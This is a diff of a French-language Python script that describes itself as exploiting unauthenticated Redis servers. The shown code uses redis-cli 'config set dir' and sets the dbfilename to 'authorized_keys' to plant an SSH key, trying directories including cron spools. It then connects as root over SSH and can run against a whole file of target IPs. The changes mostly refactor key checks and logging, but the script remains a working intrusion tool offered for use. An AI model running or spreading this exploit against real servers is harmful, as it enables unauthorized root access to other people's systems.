@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
 Nom du code : Gestionnaire de serveurs Redis non authentifiés
 Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité par Zartek-creole.
@@ -10,34 +11,29 @@ Source      :
         - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
         - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
 """
-import os
-import subprocess
 import argparse
 import logging
-from sys import argv
-from typing import Tuple, List
+import os
+import subprocess
+import sys
+from typing import List, Tuple
 
-from termcolor import colored
 
 class RedisConfig:
     CLI_PATH = '/usr/bin/redis-cli'
     CLI_PATH_ALT = '/usr/local/bin/redis-cli'
     DEFAULT_PORT = '6379'
     DEFAULT_USER = 'root'
-    DEFAULT_SSH_KEY = 'id_rsa'
+    DEFAULT_SSH_KEY = 'id_ed25519.pub'
     DEFAULT_TIMEOUT = 30
 
-def checkRedisCli(sshKey: str) -> bool:
-    """
-    Vérifie si le fichier redis-cli et la clé SSH existent.
 
-    Args:
-        sshKey (str): Le chemin vers la clé SSH.
+class ExitOnErrorHandler(logging.StreamHandler):
+    def emit(self, record):
+        if record.levelno >= logging.ERROR:
+            super().emit(record)
+            sys.exit(1)
 
-    Returns:
-        bool: True si redis-cli et la clé SSH existent, False sinon.
-    """
-    return os.path.isfile(RedisConfig.CLI_PATH) or os.path.isfile(RedisConfig.CLI_PATH_ALT) and os.path.isfile(sshKey)
 
 def configure_logging(verbose: bool):
     """
@@ -48,10 +44,11 @@ def configure_logging(verbose: bool):
     """
     logging.basicConfig(
         format="%(asctime)s - %(levelname)s - %(message)s",
-        level=logging.DEBUG if verbose else logging.INFO
+        level=logging.DEBUG if verbose else logging.INFO,
+        handlers=[ExitOnErrorHandler()]  # Utilisation du gestionnaire personnalisé
     )
 
-    
+
 class RedisServerManager:
     def __init__(self, ipAddress: str, port: str = RedisConfig.DEFAULT_PORT, user: str = RedisConfig.DEFAULT_USER, sshKey: str = RedisConfig.DEFAULT_SSH_KEY, timeout: int = RedisConfig.DEFAULT_TIMEOUT):
         """
@@ -68,10 +65,46 @@ class RedisServerManager:
         self.port = port
         self.user = user
         self.sshKey = sshKey
+        self.sshKeyPrivate = self.sshKey.rstrip('.pub')
         self.timeout = timeout
         self.dbFilename = "authorized_keys"
         self.directoryPath = self._determineDirectoryPath()
         self.commands = self._generateCommands()
+        self.binaryRedis = ''
+        ssh_key_exists, ssh_key_message = self._CheckBinary()
+        if not ssh_key_exists:
+            logging.error(ssh_key_message)
+
+    def _CheckBinary(self) -> tuple[bool, str]:
+        """
+        Vérifie la disponibilité d'un binaire spécifié et, éventuellement, d'un client SSH.
+
+        Args:
+            binaryPath (str): Le chemin vers le binaire à vérifier.
+            sshKey (str, optionnel): Le chemin vers la clé SSH (si nécessaire).
+
+        Returns:
+            tuple[bool, str]: Un tuple contenant True si le binaire et, le cas échéant, le binaire SSH existent,
+                            et une chaîne de caractères (msg) décrivant le résultat.
+        """
+        sshKey_exists = os.path.isfile(self.sshKey)
+        if not sshKey_exists:
+            return False, f"La clé public SSH '{self.sshKey}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
+        sshKeyPrivate_exists = os.path.isfile(self.sshKeyPrivate)
+        if not sshKeyPrivate_exists:
+            return False, f"La clé privée SSH '{self.sshKeyPrivate}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
+
+        try:
+            subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        except subprocess.CalledProcessError:
+            return False, "Le client SSH n'est pas installé sur votre système. Assurez-vous d'avoir installé un client SSH compatible. (apt install openssh-client)"
+        if os.path.isfile(RedisConfig.CLI_PATH):
+            self.binaryRedis = RedisConfig.CLI_PATH
+        elif os.path.isfile(RedisConfig.CLI_PATH_ALT):
+            self.binaryRedis = RedisConfig.CLI_PATH_ALT
+        else:
+            return False, "Le client Redis n'est pas installé sur votre système. Assurez-vous d'avoir installé un client Redis compatible. (apt install redis-tools)"
+        return True, "Tout est bon."
 
     def _determineDirectoryPath(self) -> str:
         """
@@ -127,7 +160,7 @@ class RedisServerManager:
             "/var/spool/cron/crontabs",
             "/var/spool/cron",
         ]:
-            
+
             command = ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dir', dname]
             success, _ = self._executeCommand(command)
             if success:
@@ -145,7 +178,7 @@ class RedisServerManager:
         Returns:
             Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
         """
-        
+
         try:
             result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout, text=True)
             return self._checkRedisResult(result, command)
@@ -191,6 +224,7 @@ class RedisServerManager:
         except Exception as e:
             return False, f"Erreur de connexion SSH : {str(e)}"
 
+
 def processFile(filePath: str, port: str, user: str, sshKey: str, timeout: int):
     """
     Traite un fichier contenant des adresses IP de serveurs Redis.
@@ -209,6 +243,7 @@ def processFile(filePath: str, port: str, user: str, sshKey: str, timeout: int):
                 manager = RedisServerManager(ipAddress, port, user, sshKey, timeout)
                 manager.processServer()
 
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="Gestionnaire de serveurs Redis non authentifiés",
@@ -217,19 +252,18 @@ if __name__ == "__main__":
 
     parser.add_argument('--ip', help="Adresse IP du serveur Redis")
     parser.add_argument('-f', '--file', help="Chemin vers le fichier contenant les adresses IP")
-    
+
     parser.add_argument('--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
     parser.add_argument('--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur pour la connexion Redis")
     parser.add_argument('--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin vers le fichier de clé SSH")
     parser.add_argument('--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Timeout pour la connexion")
     parser.add_argument('-v', '--verbose', action='store_true', help="Augmente la verbosité des logs")
 
-
     args = parser.parse_args()
-    
+
     # Configuration du logging
     configure_logging(args.verbose)
-    
+
     # Utilisation des valeurs fournies par l'utilisateur ou des valeurs par défaut
     ip_address = args.ip
     file_path = args.file
@@ -238,17 +272,13 @@ if __name__ == "__main__":
     sshKey = args.sshKey
     timeout = args.timeout
 
-
     if not (ip_address or file_path):
         logging.warning("Aucune adresse IP ou chemin de fichier spécifié. "
                         "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
                         "'-f' pour spécifier un fichier contenant des adresses IP. "
                         "Utilisez '--help' pour plus d'informations.")
-    elif not checkRedisCli(args.sshKey):
-        logging.error("Redis CLI ou fichier de clé SSH introuvable.")
+    elif ip_address:
+        manager = RedisServerManager(ip_address, args.port, args.user, args.sshKey, args.timeout)
+        manager.processServer()
     else:
-        if ip_address:
-            manager = RedisServerManager(ip_address, args.port, args.user, args.sshKey, args.timeout)
-            manager.processServer()
-        else:  # file_path is not None
-            processFile(file_path, args.port, args.user, args.sshKey, args.timeout)
+        processFile(file_path, args.port, args.user, args.sshKey, args.timeout)
